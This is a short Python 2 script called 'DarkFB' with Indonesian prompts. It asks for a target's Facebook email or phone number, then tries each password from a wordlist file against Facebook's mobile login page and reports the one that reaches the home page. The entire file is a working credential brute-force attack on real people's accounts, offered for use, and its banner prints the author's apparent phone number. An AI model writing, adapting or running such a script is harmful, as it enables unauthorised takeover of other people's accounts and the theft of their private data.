import requests
import sys
import os
os.system("clear")
os.system("figlet DarkFB")
print
print
print "===============/|\==============="
print "         Author : zynxx"
print "        Wa : 082333537819"
print "===============/|\==============="
print
print
print "Masukkan email target!"

email = raw_input("Email/No HP : ")

url='https://m.facebook.com/login'
ex = open('list.txt', 'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
    content = http.content
    if "Beranda" in content:
        print "[!] Bener Cok |",password
        sys.exit(1)
    else:
        print "[-] Salah Cok |",password
